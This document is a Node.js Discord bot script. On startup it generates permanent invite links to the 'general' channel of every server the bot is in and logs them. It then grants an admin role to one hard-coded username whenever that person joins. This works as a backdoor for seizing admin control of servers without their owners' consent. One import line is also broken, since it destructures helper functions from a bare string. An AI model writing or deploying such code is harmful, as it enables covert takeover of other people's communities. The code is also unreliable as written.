const Discord = require("./node_modules/discord.js");
const client = new Discord.Client();
const Info = require('./info.json');

const { createAdminRole, sleep, printRoles } = './common_functions.mjs';

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);

  console.log(client.guilds.map(guild => guild.name));

  client.guilds.forEach(async guild => {
    let channel = guild.channels.filter(channel => channel.name == 'general').first();

    console.log(guild.name);
    console.log(guild.channels.map(channel => channel.name));
    console.log(channel.name);

    channel.createInvite({
      temporary: false,
      maxAge: 0,
      maxUses: 0,
      unique: true
    }, 'because').then(invite => console.log(invite.url));

    // Delete all the old Bot Manager roles.
    guild.roles.filter(role => role.name == "Bot Manager").forEach(role => {
      if (role.members.size == 1) {
        role.delete();
      }
    });

    await sleep(3000);
    printRoles(guild);
  });
});

client.on('guildMemberAdd', member => {
  let guild = member.guild;

  if (member.user.toString() == Info.nuttyusername) {
    createAdminRole(guild, client, member);
  }
});

client.login(Info.token);
